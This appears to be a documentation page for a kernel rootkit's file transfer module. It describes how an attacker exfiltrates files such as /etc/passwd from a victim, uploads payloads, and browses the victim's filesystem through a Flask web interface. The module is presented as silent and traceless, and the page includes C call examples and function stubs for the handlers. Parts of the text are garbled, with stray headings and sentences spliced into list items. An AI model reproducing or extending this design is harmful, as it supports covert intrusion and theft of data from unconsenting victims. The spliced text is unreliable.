\page transfer File Transfer

\tableofcontents

The rootkit integrates a complete **file transfer** mechanism between the attacking machine and the victim machine. This system allows exfiltrating and injecting files quickly, simply, and discreetly. The whole system is controllable with a few clicks from the graphical interface. Two functionalities are offered:
- *download*: exfiltration of a file from the victim
- *upload*: injection of a file from the attacker to the victim

## 1. 🛠️ Overview

Files can be downloaded from the victim machine to the attacker.

The system relies on two complementary components:

- a **web interface** allowing the attacker to navigate, send or receive files,## Upload

- a **kernel** part, capable of reading or writing on the remote file system in a completely stealthy manner.

Files can be uploaded from the attacker to the victim machine.

The protocol is simple:

1. A command is sent to the rootkit via TCP (`upload` or `download`),## Protocol

2. The rootkit prepares the transfer and responds `READY`,

3. The file is then transmitted in encoded format (hexadecimal) in packets,Transfers use the encrypted TCP channel with chunking for large files.

4. Once finished, the module releases the used memory.

Transfers use hexadecimal format to ensure maximum network compatibility while simplifying analysis and processing.

```c
// === UPLOAD ===
upload_handler("/tmp/payload.bin 2048", TCP);
// => READY
handle_upload_chunk(data_chunk1, 1024, TCP);
handle_upload_chunk(data_chunk2, 1024, TCP);
// => File written to disk by the rootkit

// === DOWNLOAD ===
download_handler("/etc/passwd", TCP);
// => SIZE 1234
download("READY");
// => Content sent in hexadecimal
```

## 2. 📤 Upload

### 2.1 Web Interface

The upload part of the file transfer system allows choosing a local file and specifying its target path on the victim. Once validated, the Flask web interface:
- reads the file into memory,
- prepares an `upload <remote_path> <size>` command,
- sends the file in **successive chunks** upon receiving the `READY` keyword from the rootkit.

Each step is controlled and confirmed via a message system.

### 2.2 Rootkit

Upon receiving the `upload` command, the rootkit:
- dynamically allocates a memory buffer,
- initializes the target path,
- responds `READY` to the Flask interface,
- then receives data via `handle_upload_chunk()` in several pieces until the announced size is reached.

Once the file is complete, it's written to disk, and resources are automatically cleaned up.

```c
// upload_handler: initializes upload
int upload_handler(char *args, enum Protocol protocol) {
    // Parse path and size
    // Allocate memory with vmalloc
    // Respond "READY" if everything is ready
}

// handle_upload_chunk: receives data
int handle_upload_chunk(const char *data, size_t len, enum Protocol protocol) {
    // Copy chunks into buffer
    // Once complete: write file to disk
}
```

## 3. 📥 Download

### 3.1 Web Interface

Reverse upload (download) is triggered from the graphical interface through the file explorer. Once launched:
- the rootkit sends a `SIZE <bytes>` message,
- the interface responds `READY`,
- the file is received and saved in a secure folder (`downloads`).

### 3.2 Rootkit

During a download, the rootkit:
- opens the requested file,
- reads its entire content into memory,
- encodes everything in hexadecimal,
- waits for the `READY` command to launch transfer to the attacker.

Everything is done silently, without visible logs or traces in user file systems.

```c
// download_handler: prepares reading
int download_handler(char *args, enum Protocol protocol) {
    // Opens file
    // Reads content into memory
    // Responds with "SIZE <size>"
}

// download: sends file after "READY"
int download(const char *command) {
    // Encode in hexadecimal
    // Send buffer via send_to_server_raw
    // Free allocated memory
}
```

## 4. 🗂️ File Explorer

The `/explorer` page of the web interface allows remotely navigating the **victim's file system**, relying on successive `ls` commands sent via the rootkit. Navigation is not persistent: at each request, a command is sent to the rootkit to list the current directory content. It's only when using the **reverse shell** that command sending becomes persistent.

The current path is maintained on the interface side (frontend) to reconstruct a coherent navigation experience. Each click on a folder sends a new `ls <path>` command to the rootkit, which returns the list of files or subdirectories present at that location.

This functionality allows the attacker to:
- quickly locate interesting files on the victim,
- initiate a download (`download`) or upload to a specific directory,
- analyze the remote system structure without leaving apparent traces on the user side.

A history of successive file transfers is also available.

## 5. 🔐 Security

All network exchanges occur via the already encrypted TCP channel (AES). Using hexadecimal format avoids binary transport problems while simplifying processing on the rootkit side. Transfers are atomic: one file at a time, with size control, acknowledgment of receipt, and strict memory management.

## 6. 💡 Improvement Ideas

- Add checksum (SHA256) to verify integrity
- Light compression (gzip, LZ4) to reduce transfer size

<img 
  src="logo_no_text.png" 
  style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  "
/>
